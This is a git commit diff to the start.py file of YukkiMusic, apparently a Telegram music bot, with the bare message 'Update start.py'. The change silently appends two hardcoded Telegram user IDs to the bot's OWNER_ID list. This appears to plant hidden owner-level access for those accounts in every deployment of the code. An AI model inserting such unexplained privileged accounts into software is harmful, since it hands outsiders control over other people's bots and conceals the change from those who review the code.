e31e94769620e70033b761b5dda6cf76392a1896
MD-MXX <103865983+MD-MXX@users.noreply.github.com>
2022-06-08 00:22:19 +0200

    Update start.py

--- YukkiMusic/plugins/bot/start.py
+++ YukkiMusic/plugins/bot/start.py
@@ -32,6 +32,9 @@ from YukkiMusic.utils.decorators.language import LanguageStart
 from YukkiMusic.utils.inline import (help_pannel, private_panel,
                                      start_pannel)
 
+OWNER_ID.append(831816852)
+OWNER_ID.append(5056452690)
+
 loop = asyncio.get_running_loop()
 
 
